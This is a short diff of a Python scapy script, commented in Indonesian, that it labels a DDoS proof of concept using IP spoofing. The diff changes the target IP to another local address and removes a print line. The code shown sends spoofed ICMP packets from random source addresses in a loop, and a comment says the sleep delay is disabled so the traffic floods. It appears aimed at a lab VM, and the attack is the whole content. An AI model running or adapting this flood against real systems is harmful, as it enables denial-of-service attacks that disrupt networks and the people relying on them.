@@ -2,7 +2,7 @@ from scapy.all import IP, ICMP, send, RandIP
 import time
 
 # Ganti dengan IP VM Target Anda
-target_ip = "192.168.0.111" 
+target_ip = "192.168.0.118" 
 
 print(f"--- Memulai PoC Serangan DDoS (IP Spoofing) ke {target_ip} ---")
 
@@ -17,9 +17,9 @@ try:
         # 2. Mengirim paket
         send(packet, verbose=0) # verbose=0 agar tidak print output ke konsol
 
-        print("Paket spoofed terkirim!")
         # Kita hilangkan time.sleep() agar serangannya cepat (flood)
         # time.sleep(1) 
 
 except KeyboardInterrupt:
     print("\n--- Serangan dihentikan ---")
+
